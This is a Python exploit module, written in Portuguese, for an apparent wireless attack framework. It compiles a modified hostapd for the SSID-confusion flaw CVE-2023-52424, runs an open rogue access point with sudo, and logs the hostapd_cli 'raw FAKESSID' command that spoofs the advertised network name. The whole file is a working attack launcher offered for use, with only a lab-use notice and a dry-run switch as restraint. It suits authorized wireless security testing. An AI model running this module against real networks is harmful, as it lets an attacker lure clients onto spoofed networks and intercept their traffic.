#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Bridge para vanhoefm/ssid-confusion-hostap (CVE-2023-52424) — SSID Confusion / MC-MitM lab.

Compila o ``hostapd`` modificado no repositório upstream (se necessário) e executa-o com a
configuração indicada. O cenário padrão do README usa ``hostapd_cli`` com ``FAKESSID`` para
simular o SSID confuso; este módulo documenta o comando exato em log após validar o ambiente.

Version: 1.0.0
"""
from __future__ import annotations

import logging
import os
import shutil
import subprocess
import textwrap
from pathlib import Path
from typing import List, Optional

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Ponte build + exec para hostapd modificado (SSID confusion)."""

    __info__ = {
        "name": "SSID Confusion Hostapd Bridge",
        "description": (
            "Build e execução do hostapd modificado (vanhoefm/ssid-confusion-hostap, BSD) para "
            "testar clientes contra confusão de SSID (CVE-2023-52424). Gera hostapd.conf mínimo "
            "se config_file estiver vazio; caso contrário usa o arquivo fornecido. "
            "Requer Linux/nl80211 e ferramentas de build (make, gcc)."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Mathy Vanhoef / hostap (upstream, invoked as subprocess)",
        ),
        "references": (
            "https://github.com/vanhoefm/ssid-confusion-hostap",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-52424",
        ),
        "devices": ("wifi",),
    }

    interface = OptString("", "Interface wlan (ex.: wlan0)")
    real_ssid = OptString("", "SSID anunciado inicialmente no hostapd.conf (rede “real” de teste)")
    fake_ssid = OptString(
        "",
        "SSID falso para o comando hostapd_cli FAKESSID (informativo / documentado nos logs)",
    )
    channel = OptInteger(1, "Canal 2.4 GHz (1–13 conforme regdom)")
    config_file = OptString(
        "",
        "Caminho absoluto para hostapd.conf existente; se vazio, gera conf em .tmp do Forge",
    )
    dry_run = OptBool(False, "Somente exibir comandos de build/exec/cli, sem executar")

    def _repo_candidates(self) -> List[Path]:
        """Possíveis raízes do clone ``ssid-confusion-hostap``."""
        here = Path(__file__).resolve()
        return [
            here.parents[5] / "submodules" / "IoT" / "ssid-confusion-hostap",
            here.parents[4] / "ssid-confusion-hostap",
            here.parents[5] / "ssid-confusion-hostap",
            here.parents[6] / "IoT" / "ssid-confusion-hostap",
        ]

    def _repo_root(self) -> Optional[Path]:
        """Retorna a primeira raiz de repositório válida encontrada."""
        for c in self._repo_candidates():
            if (c / "hostapd").is_dir() and (c / "hostapd" / "Makefile").is_file():
                return c.resolve()
        return None

    def _forge_tmp(self) -> Path:
        """Diretório temporário do submódulo WirelessXPL-Forge (``.tmp``)."""
        return Path(__file__).resolve().parents[4] / ".tmp"

    def _ensure_hostapd_binary(self, repo: Path) -> Optional[Path]:
        """Garante ``hostapd/hostapd`` compilado; executa ``make`` se o binário não existir.

        Args:
            repo: Raiz do clone ssid-confusion-hostap.

        Returns:
            Caminho do binário ``hostapd`` ou None se a compilação falhar.
        """
        hostapd_dir = repo / "hostapd"
        binary = hostapd_dir / "hostapd"
        if binary.is_file():
            return binary

        if self.dry_run:
            logger.info(
                "DRY RUN — binário ausente; compilação prevista em %s (make -j …, "
                "defconfig -> .config se .config não existir)",
                hostapd_dir,
            )
            return binary

        cfg = hostapd_dir / ".config"
        defcfg = hostapd_dir / "defconfig"
        if not cfg.is_file() and defcfg.is_file():
            try:
                shutil.copyfile(defcfg, cfg)
                logger.info("Copiado defconfig -> .config em %s", hostapd_dir)
            except OSError as err:
                logger.error("Não foi possível criar .config: %s", err)
                return None

        jobs = str(max(1, (os.cpu_count() or 2)))
        make_cmd = ["make", "-j", jobs]
        logger.info("Compilando hostapd modificado: cwd=%s cmd=%s", hostapd_dir, make_cmd)
        if self.dry_run:
            return binary if binary.is_file() else None

        try:
            proc = subprocess.run(
                make_cmd,
                cwd=str(hostapd_dir),
                check=False,
                capture_output=True,
                text=True,
            )
            if proc.stdout:
                logger.debug("make stdout: %s", proc.stdout[-4000:])
            if proc.stderr:
                logger.debug("make stderr: %s", proc.stderr[-4000:])
            if proc.returncode != 0:
                logger.error("make falhou (exit %s) em %s", proc.returncode, hostapd_dir)
                return None
        except OSError as err:
            logger.error("Falha ao executar make: %s", err)
            return None

        return binary if binary.is_file() else None

    def _resolve_config_path(self) -> Optional[Path]:
        """Resolve ou gera o arquivo hostapd.conf.

        Returns:
            Caminho do conf ou None se parâmetros inválidos.
        """
        raw = str(self.config_file).strip()
        if raw:
            p = Path(raw).expanduser()
            if not p.is_file():
                logger.error("config_file inexistente: %s", p)
                return None
            return p.resolve()

        iface = str(self.interface).strip()
        ssid = str(self.real_ssid).strip()
        if not iface or not ssid:
            logger.error("Com config_file vazio, defina interface e real_ssid.")
            return None

        tmp_base = self._forge_tmp()
        work = tmp_base / "ssid-confusion-hostapd"
        ctrl = work / "wpaspy_ctrl"
        try:
            ctrl.mkdir(parents=True, exist_ok=True)
        except OSError as err:
            logger.error("Não foi possível criar %s: %s", ctrl, err)
            return None

        ch = int(self.channel)
        body = textwrap.dedent(
            """\
            interface={iface}
            driver=nl80211
            ssid={ssid}
            channel={channel}
            ctrl_interface={ctrl}
            """
        ).format(iface=iface, ssid=ssid.replace('"', '\\"'), channel=ch)

        out = work / "hostapd_generated.conf"
        try:
            out.write_text(body, encoding="utf-8")
        except OSError as err:
            logger.error("Falha ao gravar %s: %s", out, err)
            return None

        logger.info("Gerado hostapd.conf em %s (AP aberto, ctrl_interface=%s)", out, ctrl)
        return out.resolve()

    def _hostapd_cli_path(self, repo: Path) -> Path:
        """Caminho para ``hostapd_cli`` compilado."""
        return repo / "hostapd" / "hostapd_cli"

    def run(self) -> None:
        """Compila (se preciso) e executa hostapd; registra comando ``hostapd_cli`` para FAKESSID."""
        repo = self._repo_root()
        if not repo:
            logger.error(
                "Repositório ssid-confusion-hostap não encontrado. Clone em submodules/IoT/ "
                "ou ajuste o layout esperado pelos candidatos em _repo_candidates()."
            )
            return

        conf = self._resolve_config_path()
        if not conf:
            return

        binary = self._ensure_hostapd_binary(repo)
        if not binary:
            logger.error(
                "Binário hostapd não disponível após tentativa de build em %s",
                repo / "hostapd",
            )
            return

        cli = self._hostapd_cli_path(repo)
        fake = str(self.fake_ssid).strip()
        user_conf = bool(str(self.config_file).strip())
        ctrl_dir = conf.parent / "wpaspy_ctrl"
        if not user_conf and not ctrl_dir.is_dir():
            ctrl_dir = conf.parent

        cmd = ["sudo", str(binary), str(conf)]
        cmd_str = " ".join(cmd)

        if user_conf:
            hint = fake if fake else "<ssid_falso>"
            logger.info(
                "Com config_file próprio, alinhe -p ao ctrl_interface do conf; exemplo: "
                "sudo %s -p <ctrl_interface_dir> raw FAKESSID %s",
                cli,
                hint,
            )
        else:
            if fake:
                cli_line = "sudo {} -p {} raw FAKESSID {}".format(cli, ctrl_dir, fake)
            else:
                cli_line = "sudo {} -p {} raw FAKESSID <ssid_falso>".format(cli, ctrl_dir)
            logger.info(
                "Após iniciar o AP, antes de o cliente associar, execute (outro terminal): %s",
                cli_line,
            )
        logger.info("Somente em laboratório autorizado; CVE-2023-52424 / pesquisa Wi-Fi.")

        if self.dry_run:
            logger.info("DRY RUN — hostapd: %s", cmd_str)
            logger.info("DRY RUN — working directory sugerido: %s", binary.parent)
            return

        logger.info("Iniciando hostapd: %s", cmd_str)
        try:
            subprocess.run(cmd, cwd=str(binary.parent), check=False)
        except KeyboardInterrupt:
            logger.info("hostapd encerrado pelo usuário.")
        except Exception as err:
            logger.exception("Falha ao executar hostapd: %s", err)
